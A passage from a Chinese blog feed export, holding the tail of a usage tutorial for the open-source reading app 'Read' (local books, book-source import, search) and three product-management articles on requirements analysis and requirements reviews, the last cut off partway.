title="标题的直接链接">​</a></h2><ol><li>自定义书源，自己设置规则，抓取网页数据，规则简单易懂，软件内有规则说明。</li><li>列表书架，网格书架自由切换。</li><li>书源规则支持搜索及发现，所有找书看书功能全部自定义，找书更方便。</li><li>订阅内容,可以订阅想看的任何内容,看您想看</li><li>支持替换净化，去除广告替换内容很方便。</li><li>支持本地TXT、EPUB阅读，手动浏览，智能扫描。</li><li>支持高度自定义阅读界面，切换字体、颜色、背景、行距、段距、加粗、简繁转换等。</li><li>支持多种翻页模式，覆盖、仿真、滑动、滚动等。</li><li>软件开源，持续优化，无广告。</li></ol><p><img src="https://cos.gjcloak.xyz/pigo/202303201433003.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="使用说明-添加本地小说"><a href="#使用说明-添加本地小说" class="headerlink" title="使用说明-添加本地小说"></a>使用说明-添加本地小说</h2><h3 id="给予阅读专属文件夹”Read”"><a href="#给予阅读专属文件夹”Read”" class="headerlink" title="给予阅读专属文件夹”Read”"></a>给予阅读专属文件夹”Read”</h3><p>警告</p><p>(本教程环境为：Pixel 5-Android 12)</p><p>在较新 Android 版本上，您可能需要提供专属文件夹才能导入书源、添加小说、使用字体。</p><ol><li>书架界面（也就是打开应用后的第一个界面）最右上角三个点 <code>⋮</code> 图标，然后点击<code>添加本地</code>。</li><li>此时会弹出一个“选择文件夹”，我们使用“系统文件夹选择器”</li><li>请新建一个名为 <code>Read</code> 的文件夹，当然您也可以凭自己喜好命名。</li><li>选择 <code>Read</code> 文件夹，并点击 <code>使用此文件夹</code> ，系统会提示允许阅读访问 <code>Read</code> 中的文件吗，我们点击允许。</li></ol><p><img src="https://cos.gjcloak.xyz/pigo/202303201453036.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="添加小说到书架​"><a href="#添加小说到书架​" class="headerlink" title="添加小说到书架​"></a>添加小说到书架<a href="https://gedoor.github.io/docs/get-started-quickly/add-book#%E6%B7%BB%E5%8A%A0%E5%B0%8F%E8%AF%B4%E5%88%B0%E4%B9%A6%E6%9E%B6" title="标题的直接链接">​</a></h3><ol><li>首先您需要把小说文本文件存放在 <code>Read</code> 文件夹里。</li><li>在阅读添加本地的界面，勾选您要添加的小说。</li><li>最后点击右下方的“放入书架”，完成。</li></ol><p><img src="https://cos.gjcloak.xyz/pigo/202303201454194.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="使用说明-导入书源"><a href="#使用说明-导入书源" class="headerlink" title="使用说明-导入书源"></a>使用说明-导入书源</h2><p>什么是书源</p><p>简单理解就是书籍资源的网络来源。众所周知，网络上存在许许多多或收费或免费的读书网站。然而，这些网站往往存在广告繁多、排版字体欠佳，对手机优化很差等情况。书源就是通过特定的规则，在网络上抓取书籍章节和内容，并干净整齐的呈现在手机屏幕上，优化阅读体验。</p><h3 id="本地导入​"><a href="#本地导入​" class="headerlink" title="本地导入​"></a>本地导入<a href="https://gedoor.github.io/docs/get-started-quickly/add-sources#%E6%9C%AC%E5%9C%B0%E5%AF%BC%E5%85%A5" title="标题的直接链接">​</a></h3><ol><li>添加书源文件到 <code>Read</code> 文件夹。</li><li>导航栏“我的”界面，进入“书源管理”。</li><li>点击右上角三个点 <code>⋮</code> 的图标，选择 <code>本地导入</code> 。</li><li>在系统文件选择器里，点击您要添加的书源文件。</li><li>加载完成后，勾选书源或直接全选后确定，完成。</li></ol><p>一般书源分两种导入情况，本地文件和网络链接。 书源格式后缀有 <code>txt、json</code> ，其中 <code>json</code> 文件某些情况下无法导入，需要修改后缀为<code>txt</code>格式才可导入</p><h3 id="网络导入​"><a href="#网络导入​" class="headerlink" title="网络导入​"></a>网络导入<a href="https://gedoor.github.io/docs/get-started-quickly/add-sources#%E7%BD%91%E7%BB%9C%E5%AF%BC%E5%85%A5" title="标题的直接链接">​</a></h3><ol><li>导航栏 <code>我的</code> 界面，进入 <code>书源管理</code> 。</li><li>点击右上角三个点 <code>⋮</code> 的图标，选择 <code>网络导入</code> 。</li><li>粘贴书源网址后点击确定。</li><li>加载完成后，勾选书源或直接全选后确定，完成。</li></ol><p>网路导入地址一般为:<code>https://域名/**.json</code></p><h2 id="使用说明-搜索一本书"><a href="#使用说明-搜索一本书" class="headerlink" title="使用说明-搜索一本书"></a>使用说明-搜索一本书</h2><h3 id="在书架页面的搜索框内填入关键词​"><a href="#在书架页面的搜索框内填入关键词​" class="headerlink" title="在书架页面的搜索框内填入关键词​"></a>在书架页面的搜索框内填入关键词<a href="https://gedoor.github.io/docs/get-started-quickly/search-book#%E5%9C%A8%E4%B9%A6%E6%9E%B6%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%90%9C%E7%B4%A2%E6%A1%86%E5%86%85%E5%A1%AB%E5%85%A5%E5%85%B3%E9%94%AE%E8%AF%8D" title="标题的直接链接">​</a></h3><ol><li>书架页面右上角点击 <code>🔍</code> 图标，进入搜书页面。</li><li>在顶部的输入框内输入 <code>书名</code> 或者 <code>作者</code> 。</li></ol><h3 id="从书源搜索"><a href="#从书源搜索" class="headerlink" title="从书源搜索"></a>从书源搜索</h3><p>在上一步已经添加了所需的书源，它将显示在软件主页 <code>我的</code>-<code>书源管理</code> 中。</p><ol><li>完成填入关键词</li><li>点击右边的 󠁽󠁽<code>&gt;</code> 图标以开始搜索。</li></ol><p>您大概已经找到了想看的书，请单击它，然后按左下角的 <code>放入书架</code> 按钮，它现在应该出现在您的 <code>书架</code> 页面了，准备好去阅读！</p><p>列表将会以您输入的内容匹配度较高或内容较全的方式排列。</p><p>直到所有书源搜索完毕或手动点击右下角 <code>⬜</code> 按钮停止搜索。</p><p>为什么没有搜到想要的书？</p><p>请检查您输入的关键词是否正确，否则是您添加的书源没有这本书，请更换书源再重试。</p><h3 id="从书架搜索"><a href="#从书架搜索" class="headerlink" title="从书架搜索"></a>从书架搜索</h3><ol><li>填入关键词</li><li>此时输入框下面会显示 <code>书架</code> 标签，里面包含匹配关键词的书名。</li></ol><p><img src="https://cos.gjcloak.xyz/pigo/202303201500284.png?imageMogr2/format/webp/interlace/1/quality/80"></p><ol start="3"><li>点击出现的书名按钮，按下右下角的 <code>阅读</code> 按钮去阅读！</li></ol><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://gedoor.github.io/docs/GettingStarted">入门 开源阅读 (gedoor.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分享 </tag>
            
            <tag> 阅读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5个需求分析之路常见的坑</title>
      <link href="/636.html"/>
      <url>/636.html</url>
      
        <content type="html"><![CDATA[<p>产品需求分析工作是产品一系列工作的开端，俗话说：良好的开始是成功的一半。为了让你在这个工作上有个好的开始，作者在本文总结了产品需求分析过程中5种典型的坑，并根据自己的经验教训给出了一些针对性的建议。</p><p>需求分析是产品经理的日常工作内容之一。作为产品原型设计的准备工作，需求分析在很大程度上决定了后续产品相关工作的方向和范围，其重要性毋庸置疑。所以，一个合格的产品经理应该在这个需求分析上有一定的方法和策略。</p><p>今天，龙哥根据自身以往的需求分析经历以及观察到的一些情况，分享一下需求分析工作中常见的5种坑。无论是对龙哥自己还是阅读文章的你，都算做是一种提醒和鞭策。</p><h2 id="1、把自己当用户"><a href="#1、把自己当用户" class="headerlink" title="1、把自己当用户"></a>1、把自己当用户</h2><p>这大概是产品经理最容易犯的掉进去的坑。</p><p>从需求的角度来看，产品经理是用户需求的代言人。此时，产品经理的身上其实融合了两种身份：</p><ul><li>提出需求的用户</li><li>整理需求的自己</li></ul><p>一般来说，在需求分析工作的开始阶段，产品经理大多都能保持一定的清醒，能够比较理智地区分需求的来源。随着产品需求分析工作的展开，无论是用户调研，还是竞品分析及相关需求分析巩工作，都会使得产品经理越来越熟悉用户的需求。产品经理在需求分析方面也会逐渐变得自信起来。</p><p>但较长时间沉浸在产品调研工作中所产生的成就感中，产品经理会渐渐地、不自觉地将这两种身份搞混，把自己当做典型用户，然后就会开始从自己的角度提出一些针对自己需要的但并非用户需要的需求，甚至到后期开始忽略用户调研，任凭自己的喜好来判断需求是否合理。</p><p>这种情况下，产品经理一般会变得比较固执和自我中心，会坚定地不认为自己发生了越俎代庖的状况，从而让产品后续工作出现不必要的偏差。</p><p>对此，龙哥有两个策略奉上：</p><h3 id="策略1：融入到用户当中去，定期、有节奏地将产品需求梳理的结果和用户沟通"><a href="#策略1：融入到用户当中去，定期、有节奏地将产品需求梳理的结果和用户沟通" class="headerlink" title="策略1：融入到用户当中去，定期、有节奏地将产品需求梳理的结果和用户沟通"></a>策略1：融入到用户当中去，定期、有节奏地将产品需求梳理的结果和用户沟通</h3><p>龙哥的经验是最少进行两次这样的沟通。一次是产品需求框架梳理完成，这次的沟通可以过滤掉方向上的偏差和错误；一次是产品需求细节梳理完成，这次的反馈可以在细节上过滤掉偏差和失误。</p><p>经过这样两次的沟通、反馈，基本上不会出现低级或致命的偏差，可以有效地避免踏入此坑。同时，可以将这两次反馈发现的错误情况进行记录，找时间反思一下自己为什么当时会犯错。</p><h3 id="策略2：将自己和用户的角色关系拉平，不要将自己当做上帝"><a href="#策略2：将自己和用户的角色关系拉平，不要将自己当做上帝" class="headerlink" title="策略2：将自己和用户的角色关系拉平，不要将自己当做上帝"></a>策略2：将自己和用户的角色关系拉平，不要将自己当做上帝</h3><p>产品最终是给用户用的，某个功能需不需要，需求强度是低还是弱，并不是产品经理说了算，而是目标用户说了算。</p><p>产品经理要摆正自己的心态，记住自己的责任不是制定需求，而是发现用户需求，然后用自己的专业能力和知识将发现的用户需求变成规范、完善的需求描述文档。</p><p>一定要尊重用户的声音，因为你要的是产品成功，而不是你的所谓需求成功。</p><p>每当你固执地坚持某个自认为正确的需求的时候，记得及时想起龙哥这句话。</p><h2 id="2、被用户带偏"><a href="#2、被用户带偏" class="headerlink" title="2、被用户带偏"></a>2、被用户带偏</h2><p>产品经理的需求分析之路是一个坑接着一个坑的。坑坑不穷，生生不息。</p><p>成功跳过第一个坑的产品经理们这个时候会遇到第二个坑——被用户带偏。</p><p>虽然说产品需求最终是来源于用户的，但是，合格的产品经理们都应该知道，用户大多数是不专业的，他们往往会倾向于短视，会给出一个貌似是需求但却不是真正需求的表面需求（真绕啊~）。</p><p>如果你不是足够用心和敏锐，会很容易出现被用户带偏的情况，尽管这并非给你提出这样需求的用户的本意。</p><p>对于此坑，龙哥给你一个锦囊：<strong>问问为什么。</strong></p><p>用户短视不是没有理由的，因为他想解决问题，他只不过是在自己的所知范围内找了一个他认为的合理的解决方案出来，你如果把这个解决方案当需求，那就会被带偏，甚至偏的相当离谱。</p><p>基于以上分析，你就会发现一个事实：可以通过问“为什么”（为什么你要这个功能？为什么你想这么做？）来获得用户表面需求背后的真实需求。一旦找到真实需求，自然就不会出现被带偏的情况。</p><p>举个栗子（一个产品经理都听的耳朵起茧的例子，所以龙哥只是提要一下，真不知道的筒子们可以度娘或者人肉一下）：</p><p>产品经理－福特：你还想要什么？</p><p>用户：我想要一匹更快的马</p><p>产品经理－福特：为什么你要一匹更快的马？</p><p>用户：因为我想速度更快一些，好节省时间</p><p>产品经理－福特：我造了个东西，叫汽车，比马快多了</p><p>这个坑是考验产品经理专业程度的地方，你不能懒，要用心，要从用户的表面需求中挖掘出他的真实需求。</p><h2 id="3、眉毛胡子一把抓"><a href="#3、眉毛胡子一把抓" class="headerlink" title="3、眉毛胡子一把抓"></a>3、眉毛胡子一把抓</h2><p>产品经理跟用户打成一片，也能从表面需求透视到真实需求了，这个时候，第三个坑来了——眉毛胡子一把抓。</p><p>此时，产品经理搜集了一大推需求，每个都是货真价实的真需求，看起来都很重要，都不可或缺，但又隐隐约约感觉到这些需求的确有些多，看着有些头大。</p><p>这个现象的原因，大多数情况下，是因为没有对需求进行分类和优先级排序。关于这个坑，龙哥有一个建议：</p><p>使用KANO模型（来龙去脉这种事情，龙哥不普及，有为青年一般都自行解决）。</p><p>KANO模型将需求分为以下三种：</p><ul><li><strong>核心需求：</strong>龙哥也称之为基础需求。没有这个类型的需求，产品就没有做下去的必要。比如一个音乐播放器居然不能播放mp3</li><li><strong>期望需求</strong>：在基础需求上的优化。有了这个类型的需求，你的产品就会让用户用起来比较舒服，比如音乐播放器可以自动下载并显示和当前播放歌曲完美匹配的歌词</li><li><strong>兴奋需求：</strong>满足核心需求背后的用户心理动机。这个类型的需求，通常会让用户产生产品经理带我飞的感觉，比如音乐播放器的歌曲排行榜、歌曲的音效增强等等</li></ul><p>这个排列顺序不是龙哥随意的写的。一般来讲，研发一款新产品，核心需求优先级最高，期望需求次之，兴奋需求再次之。</p><h2 id="4、被领导掰弯"><a href="#4、被领导掰弯" class="headerlink" title="4、被领导掰弯"></a>4、被领导掰弯</h2><p>顺利走过了第三个坑，恭喜你，你现在来到了第四个坑——被领导掰弯。</p><p>你带着自己发现的、经过整理和分类的、而且排了优先级的用户需求，壮志满怀地跟领导汇报，期望得到领导的赞许和肯定，然而，你总会遇到被领导否掉的情况，尽管有时候你认为自己是对的。</p><p>莫名其妙地，你居然被领导掰弯了，搞出一个领导认可但你可能表面认可但内心去不一定认可的需求出来。</p><p>针对这一坑，龙哥的策略如下：<strong>这个坑要看情况。</strong></p><p>如果领导是内行，那一般情况下，领导吃的盐比你吃的饭可能都多，他会高瞻远瞩，看到一些你没有看到的东西，给你一些超越你现有积累、经验以及教训范围的建议，因为这是超越你的，所以你当时可能很难理解，但你应该听他的。</p><p>另外一种情况，领导是外行，不但外行而且强势。这个时候就很可能出现这样的情况：分明不同意他的意见，但却碍于他是领导，不好意思说或者不敢说。</p><p>此时，龙哥给你的建议是：尝试地去说。整理好你的理由，而且你要对自己自信，你要相信自己不会平白无故地弄个莫须有的需求出来，你给领导讲你的逻辑或者论据，如果你理由充分且正确，领导也没有必要坚持一个错误的东西，毕竟产品好公司才会好。</p><p>当然，如果你尝试了3次以上，涛声依旧的话，那真的好好想想了。</p><h2 id="5、究竟要怎么开发"><a href="#5、究竟要怎么开发" class="headerlink" title="5、究竟要怎么开发"></a>5、究竟要怎么开发</h2><p>搞定了领导，你来到了最后一个坑——究竟要怎么开发？</p><p>你可能会说，这还不简单，只开发核心需求呗。</p><p>事实上，如果你做过产品需求分析，就会发现，其实核心需求也是很多的。</p><p>关于这个问题，龙哥有以下两个心得：</p><h3 id="策略1、明确本次上线产品的目的"><a href="#策略1、明确本次上线产品的目的" class="headerlink" title="策略1、明确本次上线产品的目的"></a>策略1、明确本次上线产品的目的</h3><p>并不是所有核心功能都是要上的。在不同的产品时期或者版本规划，核心功能的侧重点都是不一样的。你要明确这个时期或版本所要解决的目标用户的主要问题，也就是你本期产品的主要目的。</p><p>比如音乐播放器的第一版，首先要解决的是能够流畅、正确地播放市面上主流的音频格式。</p><h3 id="策略2、围绕这个目的进行功能的MVP化"><a href="#策略2、围绕这个目的进行功能的MVP化" class="headerlink" title="策略2、围绕这个目的进行功能的MVP化"></a>策略2、围绕这个目的进行功能的MVP化</h3><p>此MVP并非NBA的MVP，而是最小可行性产品的意思。这个MVP的范围是根据策略1的目的来定的，是核心功能的子集。所以，这里的两个策略是配合着使用的。</p><p>根据本期的产品目的划分出MVP，然后针对MVP进行产品化工作，以最小的工作量、最短的时间，最低的风险来验证产品的可行性。如果验证结果是对的，那就乘胜追击；万一不对，船小也好调头，尽快调整一下策略然后重新开始。</p><p>判断MVP是否合格有两个标准：第一个标准是“完整”，也就是说有了这些功能，产品的目的就能实现；第二个标准是“必要”，必要的意思是指定的功能不可减少，如果少一个，那么产品的目的就无法实现。</p><p>产品需求分析之路，可谓一步一个坑，一不小小就会掉坑里。</p><p>作为一个合格的产品经理，首先要熟悉这些坑的位置，大小和形状；其次，还要眼明脚快身体棒，及时填坑或绕坑。如此，方能成功地通往产品工作的下一站。</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 用户 </tag>
            
            <tag> 需求分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>需求评审，是产品经理的一场自我较量</title>
      <link href="/604.html"/>
      <url>/604.html</url>
      
        <content type="html"><![CDATA[<p>需求评审，产品经理们再也熟悉不过的工作，但对于许多产品新人来说，不是一件简单的事。这是一场和自己的较量，毕竟是否准备充分，是否能将自己的方案经受住其他人的灵魂拷问，归根结底，还是产品经理自己的事。具体要怎么做，希望本篇文章能给各位带来帮助。</p><p>大家好，本期我们分享的是产品经理每天都会做的工作，很熟悉，但是很多产品经理也很恐惧，那就是：需求评审。需求评审是产品经理的一场考试，其实我觉得更是产品经理的一场自我较量，是产品经理自己是否准备充分，是否能将自己的方案经受住其他人的灵魂拷问，归根结底，还是产品经理自己的事。</p><h2 id="一、故事引入"><a href="#一、故事引入" class="headerlink" title="一、故事引入"></a>一、故事引入</h2><p>小李新入职了一家公司，领导安排小李先熟悉业务，给他开通了一个测试账号，小李就在测试环境上走流程、看功能，流程都走通了，对业务也有了一定的了解。3天后小李找到领导；</p><p>小李：领导，我熟悉的差不多了，有什么工作吗，分给我一个？</p><p>领导：正好业务方提了一个需求，你来跟进下吧。这个需求就是住院的医嘱计费节点配置功能（医嘱是指医师在医疗活动中下达的医学指令，比如开药，做一次CT检查）</p><p>小李拿着需求，第二天就画完了原型，写完了PRD，约了开发准备评审。</p><p>评审会上小李慷慨激昂的讲完了需求，心里想：等着开发排期吧。</p><p>突然，气氛有些不对。</p><p>开发老张说：第三方检查系统要触发计费的怎么处理，据我所知，有的PACS系统是在登记成功的时候要调用HIS进行计费。</p><p>小李有些懵，以为所有的计费只需要护士分解提交就可以计费了呢。</p><p>这个故事告诉我们，新人去了公司一定不用急着干活，虽然我们做不到很全面地了解业务和功能，但是在接到需求时，一定要了解清楚这几点：</p><p><img src="https://cos.gjcloak.xyz/pigo/202303171059839.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p><strong>1.这个需求的背景是什么</strong></p><p>也就是说为什么要做这个需求，谁提出的，比如HIS系统里，是护士提出的，还是医生提出的，是在什么场景下提出的？是遇到什么困难了需要系统帮忙解决？</p><p><strong>2.这个需求对现有系统有哪些影响</strong></p><p>如果做这个需求，对现有系统哪些地方会影响，列出影响当前系统的点，这个一定要自己亲手去体验产品，根据现有的逻辑和交互去考虑，如果不了解现在的功能，那么很容易会遗漏或者方案有冲突。</p><p><strong>3.这个需求的分类</strong></p><p>需求是否是属于标准型产品还是个性化产品，思考能否做成通用的产品，如果不能，怎么来平衡对其他客户对影响，尤其是在to B的业务里，是经常遇见的，产品经理要深入了解业务场景，才能判断好。</p><p><strong>4.做最优的方案</strong></p><p>这个是最难的，也是值得我们最应该思考和努力的。</p><p>如果有多个解决方案，我们肯定会采取成本最小的方案，但是笔者最近一直在思考一个问题：系统做的功能就是最优的方案吗，我的答案是非也，其实很多时候我们通过管理要求、相关制度可以解决问题，举个例子：医院放射科的主任说需要限制每天临床的加急患者，否则加急的插队多了患者会投诉，但是控制加急的患者靠系统合适吗，是否需要加急医生最有决定权，系统是完成不了这个事情的，所以不是所有的需求都应该通过系统满足，有时会适得其反。</p><p><strong>5.这个需要的范围有多大</strong></p><p>这个需求仅仅是我们看到的样子吗？未必，一个需求有时候会连接好几个系统都要配合，这个也要考虑到，拿HIS系统举例，HIS和医技系统有很多业务接口交互，新增需求很可能会影响到第三方改动。</p><h2 id="二、需求评审是为了什么，都有哪些角色参与"><a href="#二、需求评审是为了什么，都有哪些角色参与" class="headerlink" title="二、需求评审是为了什么，都有哪些角色参与"></a>二、需求评审是为了什么，都有哪些角色参与</h2><p>我们做产品的，对需求评审的一个共识就是需求评审就是给开发讲我们要做的功能，让开发帮我们干，这样理解没有问题，但是最重要的是让我们做的事情，大家达成一个共识。只有大家达成了共识，认为我们是做一件正确的事，你的需求评审就赢了一半，大家也才会努力的去做，剩下一半就是要把功能怎么讲解给项目人员，让大家对自己要做的部分很清晰。</p><p>需求评审时参与的角色：项目经理、产品经理、前后端开发，UI，测试等项目人员。</p><h2 id="三、需求评审，开发关注什么？"><a href="#三、需求评审，开发关注什么？" class="headerlink" title="三、需求评审，开发关注什么？"></a>三、需求评审，开发关注什么？</h2><p>俗话说，知己知彼，百战百胜，很多人之所以评审时被开发怼或者质疑，就是因为不清楚评审的对象他们心里想要的评审是什么样子。</p><p>前后端开发关注的点如下：</p><p><img src="https://cos.gjcloak.xyz/pigo/202303171101865.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h3 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h3><p><strong>业务逻辑：</strong>我们拿线下购物举例，我们去超市购买东西需要先加入到购物车，然后收银台付款后，商品我们才能带走，映射到程序里，就是提供搜索、浏览商品、加入购物车、提交订单、支付的功能，在程序里也是有逻辑的，不可能未付款就给发货，只有有了逻辑，开发才可以按照逻辑去写代码。</p><p><strong>数据字典：</strong>数据字典产品可以理解为我们设计产品的字段，开发设计数据库时，需要表，表里面就是字段，我们提供一份完整的数据字典，开发在设计表的时候就能填充进去字段，数据字典一般包括字段名称、字段的类型、字段的来源、字段的长度等。</p><p><strong>实体关系：</strong>实体关系说经过现抽象出来的概念，比如我们去医院看病，患者就是一个实体，医生是一个实体，医生所在的科室也是一个实体，实体和实体之间是有关系的，一个科室可以有多个医生，一个医生属于一个科室，我们在设计产品的时候也要把业务类的概念抽象出实体，然后梳理实体店关系</p><p><strong>业务流程：</strong>凡事都有流程，先做什么后做什么，产品设计也是如此。在评审的时候我们一定要把流程描述清楚，拿购物举例：用户浏览商品-加入购物车-提交订单-付款-商家发货-商品配送-用户收货，可以通过画流程图的形式将业务的流程表达出来。</p><h3 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h3><p><strong>页面：</strong>前端关注的是页面的元素是什么，页面上是否需要表单、下拉框、弹窗等等</p><p><strong>交互：</strong>交互有页面之间的跳转关系，也有特殊要求的动态效果</p><p><strong>总结：</strong>前端一般不参与处理业务逻辑和处理数据，所以关注的是交互和页面上的元素，相反，后端开发需要处理逻辑处理数据，所以前后端关注的点是不一样的。</p><h2 id="四、需求评审时描述功能要怎么描述"><a href="#四、需求评审时描述功能要怎么描述" class="headerlink" title="四、需求评审时描述功能要怎么描述"></a>四、需求评审时描述功能要怎么描述</h2><p><strong>建立场景化的表达</strong></p><p>场景表达是具体到用户或者系统的操作场景，这样参加评审的人员听起来就不会很懵，建立起来场景，大家的接受情况就会很高，评审效率也会很高</p><p>举例：PACS系统医院的登记员给患者在登记时调用HIS的计费接口，需求评审时候可以说在点击【登记】按钮时，调用计费接口。</p><p>这个说法看上去没有问题，但是如果通过场景化来表达，就会特别清晰。</p><ul><li>非预约登记：点击登记按钮时调用计费接口</li><li>预约登记（非签到）：点击登记按钮时调用计费接口</li><li>预约登记，需要签到：点击签到按钮时调用计费接口</li></ul><p><strong>2.描述要准确</strong></p><p>在需求评审时描述尽量用可以量化的词进行，尽量少用名词，或者描述不准备的词汇</p><p>举例：比如订单金额必须大于0才能提交，有的产品经理可能会描述成订单金额不为空、必须有订单金额才能提交。很明显，第一种的描述开发是特别清晰怎么去做的。</p><p><strong>3.规则要定义好</strong></p><p>现在技术发展迅速，基本没有实现不了的功能，我们在评审的时候一定要想好我们的业务规则，业务规则清晰，开发就能按照规则去开发。</p><p>举例：医生开立医嘱后，护士要执行，有的医院药房周六日休息，护士会提前领取（周五）将周日的药品，领取药品后就意味着给患者计费了，但是医生在周六突然停止医嘱了，周日的药不再给患者吃了，那么周日的药就要退掉，系统要做自动给护士创建一个退药的申请，那么，这个是评审的时候就需要设计到退药申请的规则问题。</p><p>那么，我们在设计产品时，这个规则一定要考虑清楚，就执行单计划时间（护士给患者服药的时间）晚于医嘱停止时间的才允许自动创建退药申请，不然没有这个规则，都退药的话，就把不该退的药也给退了。</p><h2 id="五、评审时需要注意的地方"><a href="#五、评审时需要注意的地方" class="headerlink" title="五、评审时需要注意的地方"></a>五、评审时需要注意的地方</h2><p><img src="https://cos.gjcloak.xyz/pigo/202303171101472.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>1. 评审时切忌说模棱两可的话，会让大家对你失去信任。我们知道，程序员的世界很简单，要么对，要么错，如果我们说一些可能、也行、大概的话，会遭致评审人的反感，逐渐对产品经理失去信任，产品经理是要给参加评审的人一个主心骨的，如果自己都做不到，那么别人可想而知了。</p><p>2. 产品经理在需求评审前和过程中，一定要自信，只有心里充满自信，才能在评审过程中有条理的回答别人的疑问，不要怕被质疑，产品经理注定是在不断的质疑中成长起来的。</p><p>3. 评审过程中，遇到逻辑错误、遗漏的时候，也不要慌，毕竟人无完人，可以先回答说我下去确认下或者我再思考下，尽量不要直接给出方案，因为当场给出的方案，基本都是我们没有仔细思考的，容易掉坑里。</p><p>4. 如果有需要调整方案或者补充的内容，产品经理会后要及时的完成，否则容易遗忘，丢掉关键信息。</p><p>5. 评审前，产品经理可以找好的开发同事帮忙看看大的逻辑是否存在问题，技术实现是否可行？同时在评审前，将要评审的内容提前发出来，评审时候大家就会比较有针对性的提问，提高评审效率。</p><p>6. 评审结束，要和相关角色讨论排期，如果不要排期，后面很可能会进度失控，不能如期上线，产品经理可能就要背锅了，其实产品经理某种程度上也在做项目经理的一部分事情。</p><h2 id="六、结尾"><a href="#六、结尾" class="headerlink" title="六、结尾"></a>六、结尾</h2><p>需求评审是每个产品经理必经的过程，从被开发怼，到自己应付好多人的拷问都是需要一个过程的，除了对业务本身精通外，还需要多总结经验，多和开发、测试沟通，多听取优秀的产品经理的评审，需求评审会越来越顺利。</p><p>原文：<a href="https://www.woshipm.com/pmd/5268276.html">需求评审，是产品经理的一场自我较量</a></p><p>感觉本文对自己挺有用的，特收藏以便后面继续学习</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 需求评审 </tag>
            
            <tag> 项目经理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>需求分析是什么&amp;案例解析</title>
      <link href="/572.html"/>
      <url>/572.html</url>
      
        <content type="html"><![CDATA[<p>本文将需求分为两类——工具类需求、用户端需求；并进一步给出了两个案例方便理解。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于需求分析无疑是产品经理的一项必备基础功，也是每个产品经理可能工作大部分时间都在做的事情，但是绝大部分产品经理可能不会刻意的去总结一套方法论。总的来说不总结方法论也不会有多少问题，因为毕竟基本工作很熟手，但是总结了方法论并写出来有以下几个好处：</p><ol><li>指导自己工作，在自己不知该如何着手做一个需求的时候，可以为自己提供一个框架</li><li>锻炼自己的结构化思维及总结能力</li><li>写出来与自己对话能提高自己的认知，会获得意想不到的收获</li></ol><h2 id="什么是需求分析"><a href="#什么是需求分析" class="headerlink" title="什么是需求分析"></a>什么是需求分析</h2><p>个人对需求分析就是：<strong>确认终点寻找路径的过程.</strong></p><p>从这一定义来说需求分为2类：</p><ul><li>第一类是终点比较明确，无太多争议性，此时的需求分析主要集中在寻找路径。</li><li>第二类是终点不是非常明确、甚至是极为不明确，此时需要先确认终点再去寻找路径。</li></ul><h3 id="第一类需求主要包括一些公司职能部门管理后台一些效率性工具、营销工具等"><a href="#第一类需求主要包括一些公司职能部门管理后台一些效率性工具、营销工具等" class="headerlink" title="第一类需求主要包括一些公司职能部门管理后台一些效率性工具、营销工具等"></a><strong>第一类需求主要包括一些公司职能部门管理后台一些效率性工具、营销工具等</strong></h3><p>如：财务管理、订单管理、路由配置等，这类需求考验的是产品经理的基本功，包括业务流程梳理、功能逻辑梳理、功能列表及细节，提供最终解决方案、优先级协调、方案拆解及迭代计划等。</p><p>需要注意的是，这里所说的终点比较明确是相对的，有些新人产品经理比较容易犯的错误是，业务部门提啥后台需求我就接啥。</p><p>这样很容易导致后续改改改，因为业务人员提的往往不是一个需求，而是一个解决了他们所认为的需求点的一个方案，产品经理一定要能识别需求和方案之间的差别，透过方案看到需求本身是什么。</p><p><strong>举个简单例子：</strong>运营人员提了个需求说，我想在推送配置界面里加一个EXCEL导入推送人员名单功能。</p><p>这个需求看上去很合理，这样运营就可以快速的导入推送人员名单了，但是仔细想想这是一个需求吗？或者说这个需求本质是加一个EXCEL导入功能是产品的最终形态吗？这个问题在这里不做回答，后面会举一个相类似的我在工作中遇到的实例。</p><h3 id="第二类需求主要是一些用户端需求"><a href="#第二类需求主要是一些用户端需求" class="headerlink" title="第二类需求主要是一些用户端需求"></a>第二类需求主要是一些用户端需求</h3><p>比如推出一个新的功能、一个新的玩法、对以前功能做优化。但是对于这个玩法究竟效果如何，大家都不能很确定。此类需求相对于第一类需求除了考验产品的基本功以外还需要产品经理有规划MVP（最小可行化产品）能力、数据分析能力等。</p><p>可能会有人提出还有第三类需求，就是现在啥都没有从0~1打造产品。在这篇文章的场景限定下，此类不属于一个需求，这是要做一整条产品线，这即需要产品经理对宏观了解把握、对业务熟悉、对微观的有掌控等能力，个人暂时没有实力写这样文章，如果有同学想学习此类能力，推荐学习梁宁的《产品思维30讲》、《增长思维30讲》，后续个人也会尝试着从自己的工作理解中来简单谈谈。</p><h2 id="需求分析框架"><a href="#需求分析框架" class="headerlink" title="需求分析框架"></a>需求分析框架</h2><p>需求分析框架用比较直白的话来说就是：值不值得做？做成啥样子？怎么来做？</p><p>值不值得做需要去分析目标和价值，做成啥样子需要去梳理业务流程、分析使用场景、设计功能细节，而怎么来做主要就是确认优先级、调整配置资源、完成迭代计划，以下是个人总结的需求分析的框架图：</p><p><img 